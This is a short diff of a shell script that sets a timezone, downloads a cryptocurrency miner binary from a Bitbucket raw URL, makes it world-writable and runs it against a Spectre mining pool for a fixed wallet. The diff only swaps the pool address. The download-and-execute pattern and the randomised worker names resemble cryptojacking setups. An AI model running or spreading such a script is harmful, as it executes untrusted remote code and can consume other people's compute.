@@ -4,4 +4,4 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 wget https://bitbucket.org/kzpakid/kfile/raw/main/tnn-miner1 
 chmod 777 tnn-miner1
-./tnn-miner1 --daemon-address 157.245.1.139 --port 80 --worker-name $(shuf -n 1 -i 1-999)-BC --spectre --wallet spectre:qzlnaweyxxpjmh7xp66n62j7lu008xqeytm4npxskezhx92u52jzuwv39q8zt
+./tnn-miner1 --daemon-address spr.tw-pool.com --port 14001 --worker-name $(shuf -n 1 -i 1-999)-BC --spectre --wallet spectre:qzlnaweyxxpjmh7xp66n62j7lu008xqeytm4npxskezhx92u52jzuwv39q8zt
